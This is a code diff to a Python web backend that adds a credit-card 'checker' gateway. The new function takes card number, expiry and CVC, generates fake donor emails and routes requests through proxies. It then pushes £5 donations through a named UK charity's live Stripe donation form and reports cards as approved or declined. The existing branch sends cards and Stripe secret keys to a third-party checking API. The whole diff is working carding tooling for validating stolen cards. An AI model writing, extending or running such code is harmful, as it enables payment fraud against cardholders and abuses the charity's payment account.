@@ -21,6 +21,7 @@ from bs4 import BeautifulSoup
 import httpx
 import random
 import string
+import uuid
 
 urllib3.disable_warnings()
 
@@ -604,6 +605,94 @@ async def get_products(req: ProductsRequest, user: dict = Depends(get_current_us
     flat_list = [url for sublist in results for url in sublist]
     return {"products": list(set(flat_list))}
 
+def check_givewp_stripe(card_details: str, proxy: str = ""):
+    try:
+        parts = card_details.split("|")
+        cc, m, y, cvc = parts[0], parts[1], parts[2][-2:], parts[3]
+        
+        session = requests.Session()
+        proxies_dict = {"http": proxy, "https": proxy} if proxy else None
+        if proxies_dict: session.proxies.update(proxies_dict)
+
+        email = "".join(random.choices(string.ascii_lowercase, k=10)) + str(random.randint(100, 999)) + random.choice(["@gmail.com", "@outlook.com"])
+        guid = str(uuid.uuid4())
+        sid = "elements_session_" + "".join(random.choices(string.ascii_letters + string.digits, k=11))
+        
+        # Step 0
+        res0 = session.get("https://changesbristol.org.uk/?givewp-route=donation-form-view&form-id=100546", timeout=15)
+        import re, json
+        match = re.search(r'window\.givewpDonationFormExports\s*=\s*({.*?});', res0.text)
+        if not match: return {"result": {"status": "DECLINED", "message": "Failed to extract site config"}}
+        exports = json.loads(match.group(1))
+        donate_url = exports["donateUrl"]
+
+        # Step 1
+        params = {
+            "deferred_intent[mode]": "payment", "deferred_intent[amount]": "500", "deferred_intent[currency]": "gbp",
+            "key": "pk_live_SMtnnvlq4TpJelMdklNha8iD", "_stripe_account": "acct_1IyaXDFXkg2oad08",
+            "elements_init_source": "stripe.elements", "referrer_host": "changesbristol.org.uk",
+            "session_id": sid, "stripe_js_id": guid, "top_level_referrer_host": "changesbristol.org.uk",
+            "locale": "en-US", "type": "deferred_intent"
+        }
+        session.get("https://api.stripe.com/v1/elements/sessions", params=params, timeout=15)
+
+        # Step 2
+        multipart_data = {
+            "amount": (None, "5"), "currency": (None, "GBP"), "levelId": (None, "custom"), "donationType": (None, "single"),
+            "fundId[value]": (None, "1"), "fundId[label]": (None, "General"), "fundId[checked]": (None, "true"),
+            "fundId[isDefault]": (None, "true"), "formId": (None, "100546"), "gatewayId": (None, "stripe_payment_element"),
+            "giftAid[firstName]": (None, ""), "giftAid[lastName]": (None, ""), "giftAid[address]": (None, ""),
+            "giftAid[postcode]": (None, ""), "giftAid[country]": (None, "GB"), "giftAid[optIn]": (None, "false"),
+            "firstName": (None, "John"), "lastName": (None, "Doe"), "email": (None, email), "mailchimp": (None, "false"),
+            "donationBirthday": (None, ""), "originUrl": (None, "https://changesbristol.org.uk/donations/one-off-donation-v2/"),
+            "isEmbed": (None, "true"), "embedId": (None, "100546"), "locale": (None, "en_GB"),
+            "gatewayData[stripePaymentMethod]": (None, "card"), "gatewayData[stripePaymentMethodIsCreditCard]": (None, "true"),
+            "gatewayData[formId]": (None, "100546"), "gatewayData[stripeKey]": (None, "pk_live_SMtnnvlq4TpJelMdklNha8iD"),
+            "gatewayData[stripeConnectedAccountId]": (None, "acct_1IyaXDFXkg2oad08")
+        }
+        res2 = session.post(donate_url, files=multipart_data, timeout=15)
+        data2 = res2.json()
+        if "data" not in data2 or "clientSecret" not in data2["data"]: return {"result": {"status": "DECLINED", "message": "Failed to create PI"}}
+        client_secret = data2["data"]["clientSecret"]
+        return_url = data2["data"]["returnUrl"]
+        pi = client_secret.split("_secret_")[0]
+
+        # Step 3
+        confirm_url = f"https://api.stripe.com/v1/payment_intents/{pi}/confirm"
+        payload = {
+            "return_url": return_url, "payment_method_data[billing_details][name]": "John Doe", "payment_method_data[billing_details][email]": email,
+            "payment_method_data[billing_details][address][country]": "GB", "payment_method_data[type]": "card",
+            "payment_method_data[card][number]": cc, "payment_method_data[card][cvc]": cvc, "payment_method_data[card][exp_year]": y,
+            "payment_method_data[card][exp_month]": m, "payment_method_data[allow_redisplay]": "unspecified",
+            "payment_method_data[payment_user_agent]": "stripe.js/b01c5e72b9; stripe-js-v3/b01c5e72b9; payment-element; deferred-intent; autopm",
+            "payment_method_data[referrer]": "https://changesbristol.org.uk", "payment_method_data[time_on_page]": "52795",
+            "payment_method_data[client_attribution_metadata][client_session_id]": guid,
+            "payment_method_data[client_attribution_metadata][merchant_integration_source]": "elements",
+            "payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "payment-element",
+            "payment_method_data[client_attribution_metadata][merchant_integration_version]": "2021",
+            "payment_method_data[client_attribution_metadata][payment_intent_creation_flow]": "deferred",
+            "payment_method_data[client_attribution_metadata][payment_method_selection_flow]": "automatic",
+            "payment_method_data[client_attribution_metadata][elements_session_id]": sid, "payment_method_data[guid]": guid,
+            "payment_method_data[muid]": str(uuid.uuid4()), "payment_method_data[sid]": str(uuid.uuid4()),
+            "expected_payment_method_type": "card", "client_context[currency]": "gbp", "client_context[mode]": "payment",
+            "use_stripe_sdk": "true", "key": "pk_live_SMtnnvlq4TpJelMdklNha8iD", "_stripe_account": "acct_1IyaXDFXkg2oad08",
+            "client_secret": client_secret
+        }
+        headers = {"accept": "application/json", "content-type": "application/x-www-form-urlencoded", "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/"}
+        res3 = session.post(confirm_url, data=payload, headers=headers, timeout=15)
+        res_data = res3.json()
+        
+        if "error" in res_data:
+            err = res_data["error"]
+            code = err.get("decline_code") or err.get("code", "declined")
+            return {"result": {"status": "DECLINED", "message": code}}
+        elif res_data.get("status") in ["succeeded", "requires_action"]:
+            return {"result": {"status": "APPROVED", "message": "Charged / Approved £5"}}
+        else:
+            return {"result": {"status": "DECLINED", "message": res_data.get("status", "Unknown")}}
+    except Exception as e:
+        return {"result": {"status": "ERROR", "message": str(e)}}
+
 class CheckerRequest(BaseModel):
     gateway: str
     card: str
@@ -635,20 +724,23 @@ async def run_checker(req: CheckerRequest, user: dict = Depends(get_current_user
     try:
         data = None
         if req.gateway == "stripe":
-            target_sk = req.sk
-            if req.sk_type == "non_sk":
-                admin = await db.users.find_one({"role": "admin"})
-                target_sk = admin.get("stripe_sk") if admin else None
-                if not target_sk:
-                    return {"status": False, "message": "Admin has not configured a global Secret Key"}
-            elif not target_sk:
-                target_sk = user.get("stripe_sk")
-                if not target_sk:
-                    return {"status": False, "message": "Missing Secret Key. Please configure it in settings or provide it."}
-                
-            url = f"https://api.barryxapi.xyz/skbased?key=BRY-KESNP-TUPWH-JFOT9&card={req.card}&sk={target_sk}&proxy={proxy_url}"
-            res = requests.get(url, timeout=20.0, verify=False)
-            data = res.json()
+            if req.sk_type == "site_based":
+                data = await asyncio.to_thread(check_givewp_stripe, req.card, proxy_url)
+            else:
+                target_sk = req.sk
+                if req.sk_type == "non_sk":
+                    admin = await db.users.find_one({"role": "admin"})
+                    target_sk = admin.get("stripe_sk") if admin else None
+                    if not target_sk:
+                        return {"status": False, "message": "Admin has not configured a global Secret Key"}
+                elif not target_sk:
+                    target_sk = user.get("stripe_sk")
+                    if not target_sk:
+                        return {"status": False, "message": "Missing Secret Key. Please configure it in settings or provide it."}
+                    
+                url = f"https://api.barryxapi.xyz/skbased?key=BRY-KESNP-TUPWH-JFOT9&card={req.card}&sk={target_sk}&proxy={proxy_url}"
+                res = requests.get(url, timeout=20.0, verify=False)
+                data = res.json()
             
         elif req.gateway == "shopify":
             target_urls = ""
